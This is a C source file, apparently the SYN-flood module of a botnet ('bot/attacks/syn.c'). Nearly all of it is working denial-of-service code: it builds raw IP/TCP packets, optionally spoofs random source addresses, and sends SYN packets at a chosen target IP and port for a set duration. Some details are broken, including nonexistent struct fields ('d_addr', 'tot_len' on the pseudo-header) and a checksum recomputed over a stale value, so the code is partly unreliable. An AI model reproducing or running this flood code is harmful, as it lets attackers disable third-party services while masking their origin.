// language: c
// file: bot/attacks/syn.c
// runtime: gcc / cross-compiled via make scripts
// target: Linux raw socket TCP SYN flood implementation

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include "syn.h"

struct pseudo_header {
    uint32_t source_address;
    uint32_t dest_address;
    uint8_t placeholder;
    uint8_t protocol;
    uint16_t tcp_length;
};

static unsigned short csum(unsigned short *ptr, int nbytes) {
    register long sum = 0;
    unsigned short oddbyte;
    register short answer;

    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((u_char *)&oddbyte) = *(u_char *)ptr;
        sum += oddbyte;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = (short)~sum;
    return answer;
}

void attack_syn(uint32_t target_ip, uint16_t port, uint8_t duration, uint8_t tos, uint8_t spoof) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) return;

    int one = 1;
    const int *val = &one;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
        close(sock);
        return;
    }

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);
    sin.sin_addr.s_addr = target_ip;

    char datagram[4096];
    memset(datagram, 0, 4096);

    struct iphdr *iph = (struct iphdr *)datagram;
    struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct ip));
    struct pseudo_header psh;

    iph->ihl = 5;
    iph->version = 4;
    iph->tos = tos;
    iph->tot_len = sizeof(struct ip) + sizeof(struct tcphdr);
    iph->id = htonl(54321);
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;
    iph->s_addr = inet_addr("192.168.1.100");
    iph->d_addr = sin.sin_addr.s_addr;
    iph->check = csum((unsigned short *)datagram, iph->ihl << 2);

    tcph->source = htons(31337);
    tcph->dest = htons(port);
    tcph->seq = htonl(1105024978);
    tcph->ack_seq = 0;
    tcph->doff = 5;
    tcph->syn = 1;
    tcph->window = htons(5840);
    tcph->check = 0;

    psh.source_address = iph->s_addr;
    psh.dest_address = iph->d_addr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tot_len = htons(sizeof(struct tcphdr));

    int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr);
    char *pseudogram = malloc(psize);
    if (!pseudogram) {
        close(sock);
        return;
    }
    memcpy(pseudogram, (void *)&psh, sizeof(struct pseudo_header));
    memcpy(pseudogram + sizeof(struct pseudo_header), (void *)tcph, sizeof(struct tcphdr));
    tcph->check = csum((unsigned short *)pseudogram, psize);
    free(pseudogram);

    time_t start = time(NULL);
    while (time(NULL) - start < duration) {
        if (spoof) {
            iph->s_addr = (uint32_t)rand();
        }
        tcph->source = htons(rand() % 65535 + 1);
        iph->check = csum((unsigned short *)datagram, iph->ihl << 2);

        psh.source_address = iph->s_addr;
        char *pgram = malloc(psize);
        if (pgram) {
            memcpy(pgram, (void *)&psh, sizeof(struct pseudo_header));
            memcpy(pgram + sizeof(struct pseudo_header), (void *)tcph, sizeof(struct tcphdr));
            tcph->check = csum((unsigned short *)pgram, psize);
            free(pgram);
        }

        sendto(sock, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));
    }

    close(sock);
}